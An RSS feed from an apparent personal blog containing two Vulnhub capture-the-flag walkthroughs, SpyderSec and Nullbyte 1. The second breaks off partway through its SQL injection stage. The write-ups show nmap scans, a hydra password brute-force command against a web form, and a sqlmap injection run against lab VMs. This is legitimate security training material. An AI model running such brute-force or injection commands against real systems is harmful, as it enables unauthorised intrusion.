<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Solution on Unlogic</title>
    <link>https://svenito.github.io/nowhere/tags/solution/</link>
    <description>Recent content in Solution on Unlogic</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Wed, 09 Sep 2015 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://svenito.github.io/nowhere/tags/solution/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>SpyderSec solution</title>
      <link>https://svenito.github.io/nowhere/2015/09/09/spydersec-solution/</link>
      <pubDate>Wed, 09 Sep 2015 00:00:00 +0000</pubDate>
      
      <guid>https://svenito.github.io/nowhere/2015/09/09/spydersec-solution/</guid>
      <description>&lt;p&gt;Another day, another VM. Today it&amp;rsquo;s the &lt;a href=&#34;https://www.vulnhub.com/entry/spydersec-challenge,128/&#34;&gt;SpyderSec Challenge&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;So let me start it up and get on it.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/nah3Wah.gif&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;As per usual I need the IP of the machine and
the services it has running (if any). Straight from the Unlogic Cookbook&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~/Downloads# nmap -sn 192.168.56.0/24

Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-09-09 16:07 BST
Nmap scan report for 192.168.56.1
Host is up (0.00039s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.100
Host is up (0.00017s latency).
MAC Address: 08:00:27:FF:57:41 (Cadmus Computer Systems)
Nmap scan report for 192.168.56.101
Host is up (0.00028s latency).
MAC Address: 08:00:27:56:11:10 (Cadmus Computer Systems)
Nmap scan report for 192.168.56.102
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 1.77 seconds

root@kali:~/Downloads# nmap -p- -sV 192.168.56.101

Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-09-09 16:07 BST
Nmap scan report for 192.168.56.101
Host is up (0.00049s latency).
Not shown: 65533 filtered ports
PORT   STATE  SERVICE VERSION
22/tcp closed ssh
80/tcp open   http    Apache httpd
MAC Address: 08:00:27:56:11:10 (Cadmus Computer Systems)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 155.80 seconds
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Lucky me, only one service running, and it&amp;rsquo;s good old http at that.
Let&amp;rsquo;s take a look at that page then:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/IiA6MlY.png&#34;&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/IiA6MlY.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Without wasting much time, let&amp;rsquo;s get to the clue hunting. First things first: check the source.
And there&amp;rsquo;s clue number one, right between those script tags. It evals a function which seems to
do some text processing. I&amp;rsquo;ll open Firebug to see if that shows anything interesting, and sure
enough&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;SyntaxError&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;missing&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;before&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;statement&lt;/span&gt;
    &lt;span style=&#34;color: #ae81ff&#34;&gt;61&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;c&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;27&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;c&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;64&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;e&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;62&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;69&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;27&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;29&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;b&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So that&amp;rsquo;s the output from the eval. It throws an error because the result isn&amp;rsquo;t valid
javascript. It seems to me as though it might be HEX. I&amp;rsquo;ll put it through Burp&amp;rsquo;s decoder and
sure enough it resolves to &lt;code&gt;a:l:e:r:t:(:&#39;:m:u:l:d:e:r:.:f:b:i:&#39;:):;&lt;/code&gt;. That&amp;rsquo;s not going to
affect the page in any way, but I&amp;rsquo;m sure it&amp;rsquo;s a clue. I&amp;rsquo;ll note it down and carry on exploring.&lt;/p&gt;

&lt;p&gt;The CSS contains a base64 encoded gif. I decided to investigate it by converting it to a file
and opening it in Gimp to examine it. Nothing much of interest there either. Hexdump also shows
nothing of note.&lt;/p&gt;

&lt;p&gt;Ok then, apart from that there&amp;rsquo;s nothing of interest in the source, so let me move onto the images on the page.
There&amp;rsquo;s two images: &lt;code&gt;Challenge.png&lt;/code&gt; and &lt;code&gt;SpyderSecLogo200.png&lt;/code&gt;. On first glance they appear to
have nothing special about them, but once examined with &lt;code&gt;exiftool&lt;/code&gt; I see something of interest&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~/spydersec# exiftool Challenge.png 
ExifTool Version Number         : 9.74
File Name                       : Challenge.png
Directory                       : .
File Size                       : 83 kB
File Modification Date/Time     : 2015:09:01 07:25:59+01:00
File Access Date/Time           : 2015:09:09 14:29:25+01:00
File Inode Change Date/Time     : 2015:09:09 14:29:19+01:00
File Permissions                : rw-r--r--
File Type                       : PNG
MIME Type                       : image/png
Image Width                     : 540
Image Height                    : 540
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Background Color                : 255 255 255
Pixels Per Unit X               : 2835
Pixels Per Unit Y               : 2835
Pixel Units                     : meters
Comment                         : 35:31:3a:35:33:3a:34:36:3a:35:37:3a:36:34:3a:35:38:3a:33:35:3a:
                                  37:31:3a:36:34:3a:34:35:3a:36:37:3a:36:61:3a:34:65:3a:37:61:3a:
                                  34:39:3a:33:35:3a:36:33:3a:33:30:3a:37:38:3a:34:32:3a:34:66:3a:
                                  33:32:3a:36:37:3a:33:30:3a:34:61:3a:35:31:3a:33:64:3a:33:64
Image Size                      : 540x540
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Hex strings are the order of the day here at SpyderSec. So back to Burp&amp;rsquo;s decoder once more
after removing all the colons. The string decodes to another hex string. Same dance again, and
I get a typical base64 string, decode once more and be rewarded with &lt;code&gt;A!Vu~jtH#729sLA;h4%&lt;/code&gt;. Which is
not encoded anymore. I make a note of it and carry on sleuthing.&lt;/p&gt;

&lt;p&gt;Watch out, here comes the reliable &lt;code&gt;dirbuster&lt;/code&gt;. Running it with the regular word list I discover the &lt;code&gt;v&lt;/code&gt; subdirectory.
Browsing to that however merely responds with a &lt;code&gt;403 Forbidden&lt;/code&gt; reply. I&amp;rsquo;ve not exhausted all the
nooks and crannies yet, there&amp;rsquo;s still that cookie jar to poke at.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Firebug -&amp;gt; Cookie tab -&amp;gt; URI /v/81JHPbvyEQ8729161jd6aKQ0N4/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Another clue&amp;hellip;. leading me to a subdirectory under &lt;code&gt;v&lt;/code&gt;. But that&amp;rsquo;s also forbidden. Well, let
me just plug some of the data we&amp;rsquo;ve found so far into it. The random characters from the
exif data result in a 404, but the string from the javascript alert box however brings up a
download dialog for a file called &lt;code&gt;mulder.fbi&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~/spydersec# wget http://192.168.56.101//v/81JHPbvyEQ8729161jd6aKQ0N4/mulder.fbi
--2015-09-09 17:24:38--  http://192.168.56.101//v/81JHPbvyEQ8729161jd6aKQ0N4/mulder.fbi
Connecting to 192.168.56.101:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 13960421 (13M) [text/plain]
Saving to: ‘mulder.fbi’

mulder.fbi.1            100%[===============================&amp;gt;]  13.31M  5.52MB/s   in 2.4s   

2015-09-09 17:24:41 (5.52 MB/s) - ‘mulder.fbi’ saved [13960421/13960421]

root@kali:~/spydersec# file mulder.fbi 
mulder.fbi: ISO Media, MP4 v2 [ISO 14496-14]
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;A video file, which when I play it, is the song &amp;ldquo;Twilight Time&amp;rdquo; by &amp;ldquo;The Platters&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;So here I hit another dead end.&lt;/p&gt;

&lt;p&gt;Let me think

&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/CbfWCmv.gif&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ll take inventory of the clues I have left now:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;A music video &amp;ldquo;Twilight time&amp;rdquo; titled &lt;em&gt;mulder.fbi&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;A seeming random string &lt;code&gt;A!Vu~jtH#729sLA;h4%&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So I ask myself, why is a video of a song named &lt;em&gt;mulder.fbi&lt;/em&gt;? So I do a little research
and after searching for &lt;code&gt;the platters &amp;quot;twilight time&amp;quot; x files&lt;/code&gt; I hit this section in a
&lt;a href=&#34;https://en.wikipedia.org/wiki/Kill_Switch_(The_X-Files&#34;&gt;Wikipedia article&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;When he puts it into the car stereo, it plays &amp;quot;Twilight Time&amp;quot; 
by The Platters. However, the agents take it to the Lone Gunmen, 
who discover that the disc contains a large quantity of encrypted data
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Well if that ain&amp;rsquo;t a clue and a bit! Ok, so a little more research of what data you
can hide in a video file (search for &lt;code&gt;hiding files video mp4&lt;/code&gt;) I am directed to a
&lt;a href=&#34;http://lifehacker.com/5771142/embed-a-truecrypt-volume-in-a-playable-video-file&#34;&gt;Lifehacker article&lt;/a&gt;
describing the process of hiding Truecrypt volumes in MP4s. It mentions a few ways to
detect such a volume in a video, but to be honest, I might as well just try and mount the volume.
That should be the easiest and quickest way to see if I am on the right track.&lt;/p&gt;

&lt;p&gt;Sure enough, there&amp;rsquo;s a volume in the video, but it needs a password. Well there&amp;rsquo;s only
one unused piece of the puzzle left. I plug that in and there&amp;rsquo;s our volume with the &lt;code&gt;flag.txt&lt;/code&gt; file
which contains:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;Congratulations! 

You are a winner. 

Please leave some feedback on your thoughts regarding this challenge.
Was it fun? Was it hard enough or too easy? 
What did you like or dislike, what could be done better?

https://www.spydersec.com/feedback
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Well that was a nice challenge, especially the truecrypt volume in the MP4. That&amp;rsquo;s
something new I learned from this. So thanks to &lt;a href=&#34;https://twitter.com/Spydersec&#34;&gt;@SpyderSec&lt;/a&gt;
for the challenge, and thanks to you for stopping by to read this.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Nullbyte 1 solution</title>
      <link>https://svenito.github.io/nowhere/2015/08/25/nullbyte-1-solution/</link>
      <pubDate>Tue, 25 Aug 2015 00:00:00 +0000</pubDate>
      
      <guid>https://svenito.github.io/nowhere/2015/08/25/nullbyte-1-solution/</guid>
      <description>

&lt;p&gt;I&amp;rsquo;ve been AFK for a while because of various reasons, but now I&amp;rsquo;m back and have
managed to scrape a little time together to get on with some of &lt;a href=&#34;https://vulnhub.com&#34;&gt;Vulnhub&amp;rsquo;s&lt;/a&gt;
new VMs.&lt;/p&gt;

&lt;p&gt;So let&amp;rsquo;s start with &lt;a href=&#34;https://www.vulnhub.com/entry/nullbyte-1,126/&#34;&gt;Nullbyte 1&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&#34;stage-1:d33d1c43b31d749c4d445e01e4ef8fef&#34;&gt;Stage 1&lt;/h1&gt;

&lt;p&gt;I ran the usual service discovery and found:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# nmap -sV 192.168.56.101

Starting Nmap 6.49BETA4 &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt; at 2015-08-25 11:29 BST
Nmap scan report &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; 192.168.56.101
Host is up &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;0.00057s latency&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span style=&#34;color: #ae81ff&#34;&gt;997&lt;/span&gt; closed ports
PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.10 &lt;span style=&#34;color: #f92672&#34;&gt;((&lt;/span&gt;Debian&lt;span style=&#34;color: #f92672&#34;&gt;))&lt;/span&gt;
111/tcp open  rpcbind 2-4 &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;RPC &lt;span style=&#34;color: #75715e&#34;&gt;#100000)&lt;/span&gt;
777/tcp open  ssh     OpenSSH 6.7p1 Debian &lt;span style=&#34;color: #ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;
Service Info: OS: Linux&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;HTTP server on 80 and ssh on 777. I&amp;rsquo;m going to take the straightforward one, and head
to the HTTP server first.&lt;/p&gt;

&lt;p&gt;Upon opening the page I only get an image and some text&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/SlVGKol.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I ran &lt;code&gt;dirbuster&lt;/code&gt; on the root and got a couple of hits: &lt;code&gt;uploads&lt;/code&gt; and &lt;code&gt;phpmyadmin&lt;/code&gt;. The first had disabled directory listing
and the second was a no go, but at least told me there was a SQL server available somewhere.&lt;/p&gt;

&lt;p&gt;The source of the page doesn&amp;rsquo;t reveal anything else either, so that last place we might be able to find something
is the image itself. There doesn&amp;rsquo;t appear to be any steganography involved here and nothing in the hexdump of the image
either. Well, let me take a look at the EXIF data then.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~/Downloads# exiftool main.gif 
ExifTool Version Number         : 9.74
File Name                       : main.gif
Directory                       : .
File Size                       : &lt;span style=&#34;color: #ae81ff&#34;&gt;16&lt;/span&gt; kB
File Modification Date/Time     : 2015:08:25 10:27:37+01:00
File Access Date/Time           : 2015:08:25 10:28:35+01:00
File Inode Change Date/Time     : 2015:08:25 10:27:37+01:00
File Permissions                : rw-r--r--
File Type                       : GIF
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : 235
Image Height                    : 302
Has Color Map                   : No
Color Resolution Depth          : 8
Bits Per Pixel                  : 1
Background Color                : 0
Comment                         : P-&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;: kzMb5nVYJw
Image Size                      : 235x302
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Hrmm, that comment looks unusual. Let&amp;rsquo;s try that in the URL. Initially I got a 404
but that&amp;rsquo;s because I didn&amp;rsquo;t remove the &lt;code&gt;P-):&lt;/code&gt;. Hitting &lt;code&gt;http://192.168.56.101/kzMb5nVYJw&lt;/code&gt;
takes me to a form asking for a key.&lt;/p&gt;

&lt;h1 id=&#34;stage-2:d33d1c43b31d749c4d445e01e4ef8fef&#34;&gt;Stage 2&lt;/h1&gt;

&lt;p&gt;Typing in something random just shows &lt;code&gt;invalid key&lt;/code&gt;. Ok, let me take a look at the source,
see where this thing goes.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;center&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;form&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;method=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;post&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;action=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;index.php&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;gt;&lt;/span&gt;
Key:&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;input&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;type=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;password&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;name=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;key&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt; 
&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;/center&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;!-- this form isn&amp;#39;t connected to mysql, password ain&amp;#39;t that complex --!&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ok, so no SQLi here then, and the password isn&amp;rsquo;t complex either. I&amp;rsquo;m guessing
a simple wordlist might solve this for me. Time to break out &lt;code&gt;hydra&lt;/code&gt; for this:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# hydra 192.168.56.101 http-form-post &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/kzMb5nVYJw/index.php:key=^PASS^:invalid key&amp;quot;&lt;/span&gt; -l x -P /usr/share/dict/words -t &lt;span style=&#34;color: #ae81ff&#34;&gt;10&lt;/span&gt; -w 30
Hydra v8.1 &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;c&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;2014&lt;/span&gt; by van Hauser/THC - Please &lt;span style=&#34;color: #66d9ef&#34;&gt;do&lt;/span&gt; not use in military or secret service organizations, or &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; illegal purposes.

Hydra &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt; starting at 2015-08-25 11:41:58
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;DATA&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; max &lt;span style=&#34;color: #ae81ff&#34;&gt;10&lt;/span&gt; tasks per &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; server, overall &lt;span style=&#34;color: #ae81ff&#34;&gt;64&lt;/span&gt; tasks, &lt;span style=&#34;color: #ae81ff&#34;&gt;99171&lt;/span&gt; login tries &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;l:1/p:99171&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;, ~154 tries per task
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;DATA&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; attacking service http-post-form on port 80
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;STATUS&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; 18687.00 tries/min, &lt;span style=&#34;color: #ae81ff&#34;&gt;18687&lt;/span&gt; tries in 00:01h, &lt;span style=&#34;color: #ae81ff&#34;&gt;80484&lt;/span&gt; todo in 00:05h, &lt;span style=&#34;color: #ae81ff&#34;&gt;10&lt;/span&gt; active
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;80&lt;span style=&#34;color: #f92672&#34;&gt;][&lt;/span&gt;http-post-form&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; host: 192.168.56.101   login: x   password: elite
&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; of &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; target successfully completed, &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; valid password found
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Bingo. Once I enter that into the field I am able to search for usernames.&lt;/p&gt;

&lt;h1 id=&#34;stage-3:d33d1c43b31d749c4d445e01e4ef8fef&#34;&gt;Stage 3&lt;/h1&gt;

&lt;p&gt;Entering all sorts of names reveals nothing. At this point I am guessing this
is the part that is backed by a SQL database. Although usernames and the usual
SQLi synbols don&amp;rsquo;t do much, entering nothing dumps multiple records. Maybe I will
try to &lt;code&gt;sqlmap&lt;/code&gt; the URL to see if there&amp;rsquo;s any vulnerabilities there&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;

&amp;lt;snip&amp;gt;

&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; GET parameter &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;usrtosearch&amp;#39;&lt;/span&gt; seems to be &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;MySQL &amp;gt;= 5.0.12 AND time-based blind (SELECT - comment)&amp;#39;&lt;/span&gt; injectable 
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; testing &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;Generic UNION query (NULL) - 1 to 20 columns&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; testing &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;MySQL UNION query (NULL) - 1 to 20 columns&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; automatically extending ranges &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; UNION query injection technique tests as there is at least one other &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;potential&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt; technique found
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; ORDER BY technique seems to be usable. This should reduce the &lt;span style=&#34;color: #f8f8f2&#34;&gt;time &lt;/span&gt;needed to find the right number of query columns. Automatically extending the range &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; current UNION query injection technique &lt;span style=&#34;color: #f8f8f2&#34;&gt;test&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; target URL appears to have &lt;span style=&#34;color: #ae81ff&#34;&gt;3&lt;/span&gt; columns in query
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; GET parameter &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;usrtosearch&amp;#39;&lt;/span&gt; is &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;MySQL UNION query (NULL) - 1 to 20 columns&amp;#39;&lt;/span&gt; injectable
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Result! Using this we can now dump the databasenames, tables, and data in the DB&lt;/p&gt;

&lt;p&gt;(output shortened for clarity)
